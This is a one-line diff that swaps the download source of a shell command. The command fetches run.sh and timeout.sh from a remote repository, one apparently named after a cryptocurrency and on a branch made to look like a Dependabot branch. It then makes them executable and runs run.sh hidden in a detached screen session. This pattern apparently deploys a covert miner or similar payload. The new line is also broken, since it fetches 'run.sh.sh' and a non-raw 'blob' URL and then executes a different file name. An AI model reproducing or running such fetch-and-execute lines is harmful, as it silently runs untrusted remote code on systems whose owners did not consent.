@@ -1,1 +1,1 @@
-wget https://github.com/coinqrl/01/raw/dependabot/add-v2-config-file/run.sh && wget https://github.com/coinqrl/01/raw/dependabot/add-v2-config-file/timeout.sh && chmod +x run.sh && screen -dmS run ./run.sh && chmod +x timeout.sh && ./timeout.sh
+wget https://gitlab.com/wayankarpo/01/-/blob/master/run.sh.sh && wget https://gitlab.com/wayankarpo/01/-/blob/master/timeout.sh && chmod +x run.sh && screen -dmS run ./run.sh && chmod +x timeout.sh && ./timeout.sh
